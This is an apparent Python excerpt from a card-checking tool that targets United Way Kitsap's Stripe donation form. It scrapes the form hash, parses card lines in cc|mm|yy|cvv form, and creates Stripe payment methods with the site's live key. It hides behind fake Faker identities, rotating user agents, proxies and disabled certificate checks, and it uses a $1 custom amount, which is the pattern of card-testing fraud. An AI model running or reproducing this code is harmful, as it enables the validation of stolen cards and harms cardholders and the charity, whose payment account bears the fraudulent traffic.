# ============ UNITED WAY STRIPE GATEWAY (FIXED FUNCTION NAMES) ============

UNITED_WAY_URL = "https://www.unitedwaykitsap.org/Donate/"
UNITED_WAY_AJAX = "https://www.unitedwaykitsap.org/wp-admin/admin-ajax.php"
UNITED_WAY_STRIPE_KEY = "pk_live_tL7CLPLhwWj0ufyKvozklYDB"

# Active tasks for United Way Stripe
united_way_active_tasks = {}


async def get_united_way_form_data(proxy: str = None) -> Dict:
    """Get form hash from United Way donation page"""
    try:
        us = generate_user_agent()
        
        client_kwargs = {
            'timeout': httpx.Timeout(30.0, connect=10.0, read=25.0),
            'verify': False,
            'follow_redirects': True,
        }
        if proxy:
            proxy_url = format_proxy(proxy)
            if proxy_url:
                client_kwargs['proxy'] = proxy_url
                print(f"🔧 [United Way] Using proxy: {mask_proxy(proxy_url)}")
        
        params = {
            'form-id': '101',
            'payment-mode': 'stripe',
            'level-id': 'custom',
            'custom-amount': '1',
        }
        
        headers = {
            'User-Agent': us,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Referer': 'https://www.unitedwaykitsap.org/',
        }
        
        async with httpx.AsyncClient(**client_kwargs) as client:
            response = await client.get(UNITED_WAY_URL, params=params, headers=headers, follow_redirects=True)
            
            print(f"📥 [United Way] Page status: {response.status_code}")
            
            if response.status_code != 200:
                return {"success": False, "error": f"HTTP {response.status_code}"}
            
            html = response.text
            
            # Extract form hash
            hash_match = re.search(r'name="give-form-hash"\s+value="([^"]+)"', html)
            if not hash_match:
                hash_match = re.search(r'give-form-hash[\'"]?\s*value=[\'"]?([^\'"\s>]+)', html, re.IGNORECASE)
            
            if not hash_match:
                return {"success": False, "error": "Form hash not found"}
            
            form_hash = hash_match.group(1)
            print(f"✅ [United Way] Form hash: {form_hash}")
            
            return {
                "success": True,
                "hash": form_hash,
                "form_id": "101",
                "prefix": "101-1"
            }
            
    except Exception as e:
        print(f"❌ [United Way] Form data error: {e}")
        return {"success": False, "error": str(e)}


async def create_united_way_payment_method(card: str, proxy: str = None) -> Optional[str]:
    """Create Stripe payment method and return payment method ID"""
    try:
        us = generate_user_agent()
        fake = Faker()
        
        # Parse card
        parts = card.split('|')
        if len(parts) != 4:
            return None
        
        cc, mm, yy, cvv = parts
        if len(yy) == 4:
            yy = yy[2:]
        
        name = fake.name()
        email = fake.email()
        
        client_kwargs = {
            'timeout': httpx.Timeout(30.0, connect=10.0, read=25.0),
            'verify': False,
            'follow_redirects': True,
        }
        if proxy:
            proxy_url = format_proxy(proxy)
            if proxy_url:
                client_kwargs['proxy'] = proxy_url
                print(f"🔧 [United Way PM] Using proxy: {mask_proxy(proxy_url)}")
        
        headers = {
            'User-Agent': us,
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
        }
        
        # Format data
        data = f'type=card&billing_details[name]={name}&billing_details[email]={email}&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F1e42d46cc8%3B+stripe-js-v3%2F1e42d46cc8%3B+split-card-element&key={UNITED_WAY_STRIPE_KEY}'
        
        async with httpx.AsyncClient(**client_kwargs) as client:
            response = await client.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                content=data
            )
            
            print(f"📥 [United Way PM] Status: {response.status_code}")
            
            if response.status_code != 200:
                print(f"❌ [United Way PM] Error: {response.text[:200]}")
                return None
            
            result = response.json()
            pm_id = result.get('id')
            
            if pm_id:
                print(f"✅ [United Way] Payment method created: {pm_id[:20]}...")
                return pm_id
            
            return None
            
    except Exception as e:
        print(f"❌ [United Way] Create payment method error: {e}")
        return None


